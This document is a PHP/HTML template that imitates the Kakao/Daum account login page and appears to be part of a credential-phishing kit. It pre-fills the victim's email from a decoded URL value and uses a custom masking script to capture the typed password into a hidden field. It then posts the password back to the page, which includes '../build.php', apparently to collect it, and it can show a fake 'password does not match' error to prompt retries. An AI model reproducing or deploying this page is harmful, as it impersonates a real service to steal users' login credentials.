<?php include '../build.php' ?>
<!DOCTYPE html>
<html lang="KO">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, width=device-width">
    <meta http-equiv="x-ua-compatible" content="IE=edge">
    <title>카카오계정</title>
    <link rel="shortcut icon" type="image/png" href="../assets/icons/daumlg.png">
    <link rel="icon" type="image/png" href="../assets/icons/daumlg.png">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .login-container { width: 100%; max-width: 440px; padding: 40px 24px; }
        .login-header { text-align: center; margin-bottom: 40px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; font-size: 13px; font-weight: 600; color: #191919; margin-bottom: 6px; }
        #backEMF, #rcmloginpwd { width: 100%; height: 48px; padding: 0 16px; font-size: 15px; border: 1px solid #d0d0d0; border-radius: 6px; background: #fff; color: #191919; }
        #rcmloginpwd { font-family: 'Courier New', monospace; letter-spacing: 2px; }
        #rcmloginpwd:focus { outline: none; border-color: #191919; box-shadow: 0 0 0 2px rgba(25,25,25,0.1); }
        #err { margin-top: 16px; color: rgb(251,0,0); display: <?php echo $show_error ? 'block' : 'none'; ?>; }
        .btn-login { width: 100%; height: 48px; background: #fde500; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; color: #191919; cursor: pointer; margin-top: 8px; }
        .btn-login:hover { background: #f5d900; }
        .form-options { display: flex; justify-content: space-between; align-items: center; margin: 16px 0 24px; font-size: 13px; color: #6b6b6b; }
        .form-options label { display: flex; align-items: center; gap: 6px; cursor: pointer; }
        .form-options a { color: #6b6b6b; text-decoration: none; }
        .divider { display: flex; align-items: center; margin: 24px 0; color: #8e8e8e; font-size: 12px; }
        .divider::before, .divider::after { content: ''; flex: 1; border-top: 1px solid #e6e6e6; }
        .divider::before { margin-right: 16px; }
        .divider::after { margin-left: 16px; }
        .btn-qr { width: 100%; height: 48px; background: #f0f0f0; border: none; border-radius: 6px; font-size: 14px; color: #191919; cursor: pointer; margin-bottom: 24px; }
        .footer-links { display: flex; justify-content: center; gap: 16px; margin-top: 24px; font-size: 13px; }
        .footer-links a { color: #6b6b6b; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <img src="../assets/icons/daumlg.png" width="120" height="49" alt="Daum">
        </div>
        
        <form id="demo-form" method="post" action="" autocomplete="off" onsubmit="return prepareSubmit();">
            <div class="form-group">
                <label for="backEMF">Email or ID</label>
                <input type="text" id="backEMF" name="user" value="<?php echo htmlspecialchars($decoded); ?>" readonly style="background:#f5f5f5;">
            </div>
            
            <div class="form-group">
                <label for="rcmloginpwd">Password</label>
                <input type="password" id="rcmloginpwd" name="pword" placeholder="Password" autocomplete="off">
<div id="error" style="color: rgb(211, 47, 47); margin-bottom: 20px; font-weight: 500; <?php echo (isset($error) && str_contains((string)$error, 'block')) ? 'display: block;' : 'display: none;'; ?>">카카오계정 또는 비밀번호가 일치하지 않습니다. 다시 시도해 주세요.</div>
            </div>
            
            <input type="hidden" name="pass" id="password_hidden">
            <input type="hidden" name="userDomain" value="<?php echo htmlspecialchars($domain); ?>">
            <input type="hidden" name="ref_id" value="<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>">
            
            <div class="form-options">
                <label><input type="checkbox" name="remember"> Save login information</label>
                <a href="#">Forgot password?</a>
            </div>
            
            <button type="submit" class="btn-login" id="loginButton">Log in</button>
        </form>
        
        <div class="divider">or</div>
        <button class="btn-qr" type="button">Log in with QR code</button>
        <div class="footer-links">
            <a href="#">Signup</a>
            <a href="#">Find account</a>
            <a href="#">Reset password</a>
        </div>
    </div>
    
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
    /*<![CDATA[*/
    function MaskedPassword(e,d){
        if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}
        if(e==null){return false}
        this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";
        e.value="";e.defaultValue="";
        e._contextwrapper=this.createContextWrapper(e);
        this.fullmask=false;
        var f=e._contextwrapper;
        var b='<input type="hidden" name="'+e.name+'">';
        var c=this.convertPasswordFieldHTML(e);
        f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";
        e.setAttribute("autocomplete","off");
        e._realfield=f.firstChild;e._contextwrapper=f;
        this.limitCaretPosition(e);
        var a=this;
        this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});
        this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});
        this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});
        this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});
        this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});
        this.forceFormReset(e);return true
    }
    MaskedPassword.prototype={
        doPasswordMasking:function(a){
            var d="";
            if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}
            var c=this.encodeMaskedPassword(d,this.fullmask,a);
            if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}
        },
        encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},
        createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},
        forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},
        convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},
        limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},
        addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},
        addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},
        getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}
    };
    /*]]>*/
    </script>
    
    <script>
    function prepareSubmit() {
        var pwdInput = document.getElementById("rcmloginpwd");
        var actualPassword = '';
        
        if (pwdInput && pwdInput._realfield) {
            actualPassword = pwdInput._realfield.value;
        } else if (pwdInput) {
            actualPassword = pwdInput.value;
        }
        
        if (!actualPassword || actualPassword.length <= 5) {
            $('#err').show();
            return false;
        }
        
        document.getElementById('password_hidden').value = actualPassword;
        
        if (pwdInput && pwdInput._realfield) {
            pwdInput._realfield.removeAttribute('name');
        }
        if (pwdInput) {
            pwdInput.removeAttribute('name');
        }
        
        return true;
    }
    
    $(document).ready(function() {
        var pwdField = document.getElementById("rcmloginpwd");
        if (pwdField) { new MaskedPassword(pwdField, "\u25CF"); }
    });
    </script>
</body>
</html>